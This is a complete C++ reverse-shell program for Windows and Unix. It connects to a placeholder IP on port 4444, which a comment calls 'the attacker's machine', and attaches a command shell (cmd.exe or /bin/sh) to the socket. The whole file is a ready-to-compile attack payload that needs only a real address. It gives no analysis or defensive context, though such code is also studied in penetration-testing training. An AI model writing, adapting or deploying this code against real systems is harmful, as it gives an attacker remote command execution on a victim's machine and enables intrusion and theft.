#include <iostream>
#include <cstdlib>
#include <cstring>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "Ws_32.lib")  // Link with Ws_32.lib for socket functionality
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

int main() {
    // IP address and port number for the connection
    const char* ip = "192.168.1.x";  // Replace with actual IP
    int port = 4444;

#ifdef _WIN32
    // Initialize Winsock (Windows-specific)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";  // Winsock initialization failed
        return -1;
    }
#endif

    // Address structure for socket connection
    sockaddr_in addr;
    addr.sin_family = AF_INET;  // Use IPv4
    addr.sin_port = htons(port);  // Set the port, converting to network byte order

#ifdef _WIN32
    // Convert IP address from string to binary for Windows
    inet_pton(AF_INET, ip, &addr.sin_addr);
#else
    // Convert IP address from string to binary for Unix/Linux
    inet_aton(ip, &addr.sin_addr);
#endif

    // Socket creation
#ifdef _WIN32
    SOCKET sockfd = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);  // Create socket for Windows
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();  // Clean up Winsock on failure
        return -1;
    }
#else
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);  // Create socket for Unix/Linux
    if (sockfd < 0) {
        perror("Socket creation failed");  // Print error if socket creation fails
        exit(EXIT_FAILURE);
    }
#endif

    // Connect to the attacker's machine
#ifdef _WIN32
    if (connect(sockfd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(sockfd);  // Close socket on failure
        WSACleanup();  // Clean up Winsock
        return -1;
    }
#else
    if (connect(sockfd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        perror("Connection failed");  // Print error if connection fails
        exit(EXIT_FAILURE);
    }
#endif

#ifdef _WIN32
    // Windows-specific code: use CreateProcess to launch a new process (cmd.exe)
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));  // Clear the memory for STARTUPINFOA structure
    si.cb = sizeof(si);  // Set size of structure
    si.dwFlags = STARTF_USESTDHANDLES;  // Specify that we're using custom input/output handles

    // Redirect standard input, output, and error to the socket
    si.hStdInput = (HANDLE)sockfd;  // Redirect input to socket
    si.hStdOutput = (HANDLE)sockfd;  // Redirect output to socket
    si.hStdError = (HANDLE)sockfd;  // Redirect error to socket

    ZeroMemory(&pi, sizeof(pi));  // Clear the memory for PROCESS_INFORMATION structure

    // Create a process to run cmd.exe (Windows shell)
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed\n";  // Report error if process creation fails
        closesocket(sockfd);  // Close socket on failure
        WSACleanup();  // Clean up Winsock
        return -1;
    }

    // Wait for the created process (cmd.exe) to exit
    WaitForSingleObject(pi.hProcess, INFINITE);  // Wait for process to finish
    CloseHandle(pi.hProcess);  // Close process handle
    CloseHandle(pi.hThread);  // Close thread handle

    // Clean up the socket and Winsock resources
    closesocket(sockfd);  // Close the socket
    WSACleanup();  // Clean up Winsock
#else
    // Unix/Linux-specific code: redirect standard input/output/error to the socket
    for (int i = 0; i < 3; i++) {
        if (dup2(sockfd, i) < 0) {  // Duplicate socket for stdin, stdout, stderr
            perror("dup2 failed");  // Print error if dup2 fails
            exit(EXIT_FAILURE);
        }
    }

    // Execute the shell (bash or sh depending on the system)
    char *const argv[] = {const_cast<char*>("/bin/bash"), nullptr};  // Arguments for shell execution
    if (execve("/bin/sh", argv, nullptr) < 0) {  // Replace current process with a shell
        perror("execve failed");  // Print error if execve fails
        exit(EXIT_FAILURE);
    }
#endif

    return 0;  // Program ends
}
